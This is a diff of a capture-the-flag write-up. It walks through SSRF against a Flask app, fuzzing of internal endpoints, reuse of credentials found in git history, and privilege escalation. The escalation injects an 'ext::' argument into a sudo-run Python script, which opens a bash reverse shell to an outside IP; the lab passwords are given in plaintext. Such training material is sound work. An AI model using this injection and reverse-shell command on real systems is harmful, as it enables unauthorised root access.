@@ -22,7 +22,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Ssh uses a password for authentication instead of a key, bad security practice here, ssh can be password sprayed if there are not rate limits.
 
-![[Pasted image 20261006131515.png]]
+![](../images/Pasted%20image%2020261006131515.png)
 
 # Enumerating port 80
 
@@ -36,13 +36,13 @@ Ssh uses a password for authentication instead of a key, bad security practice h
 
 ```
 
-![[Pasted image 20261006131952.png]]
+![](../images/Pasted%20image%2020261006131952.png)
 
 
 # Framework enumeration
 
 
-![[Pasted image 20261006193013.png]]
+![](../images/Pasted%20image%2020261006193013.png)
 
 from this error we can tell this is flask
 
@@ -52,10 +52,10 @@ we can reference to this page for more information
  trying to see if I can get a connection back to our machine 
 
 
-![[Pasted image 20261006193546.png]]
+![](../images/Pasted%20image%2020261006193546.png)
 
 
-![[Pasted image 20261006193621.png]]
+![](../images/Pasted%20image%2020261006193621.png)
 
 and we did ;) meaning this is vuln to SSRF ;) 
 
@@ -64,24 +64,24 @@ and we did ;) meaning this is vuln to SSRF ;)
 From here we will try to see if we can reach internal endpoionts, we can copy the request save it to a txt file and give it to fuff to FUZZ for endpoionts
 
 Make sure to include FUZZ
-![[Pasted image 20261006194459.png]]
+![](../images/Pasted%20image%2020261006194459.png)
 
 
-![[Pasted image 20261006194555.png]]
+![](../images/Pasted%20image%2020261006194555.png)
 
 there is a local instance on port 5000, we then visited the url it generated and it was giving us a file 
 
-![[Pasted image 20261006202252.png]]
+![](../images/Pasted%20image%2020261006202252.png)
 
 lets curl this and pipe it to json
 
 
-![[Pasted image 20261006202309.png]]
+![](../images/Pasted%20image%2020261006202309.png)
 
 we need to try all these endpoints to see which one is valid
 
 
-![[Pasted image 20261006203259.png]]
+![](../images/Pasted%20image%2020261006203259.png)
 
 we found credentials 
 
@@ -91,11 +91,11 @@ Pasword: dev080217_devAPI!@
 We could use these creds to ssh into the machine
 
 
-![[Pasted image 20261006203431.png]]
+![](../images/Pasted%20image%2020261006203431.png)
 
 we can see there is an other user here 
 
-![[Pasted image 20261006210850.png]]
+![](../images/Pasted%20image%2020261006210850.png)
 
 
 after going back to the /apps/.git folder i didnt know we could use git commands there , so apparently  by doing git log we get the commit history once we found a commit related to our second user prod we used  git show commit number and we found prods credentials 
@@ -104,7 +104,7 @@ username:  prod
 password:  080217_Producti0n_2023!@
 
 
-![[Pasted image 20261006211438.png]]
+![](../images/Pasted%20image%2020261006211438.png)
 
 
 After login in as user prod we did sudo -l to see if we can run anything as root
@@ -133,7 +133,7 @@ or we can use a reverse shell
 sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c bash% -c% 'bash% -i% >&% /dev/tcp/10.10.14.100/1234% 0>&1'"
 ```
 
-![[Pasted image 20261006215604.png]]
+![](../images/Pasted%20image%2020261006215604.png)
 
 gave us the flag! 
 
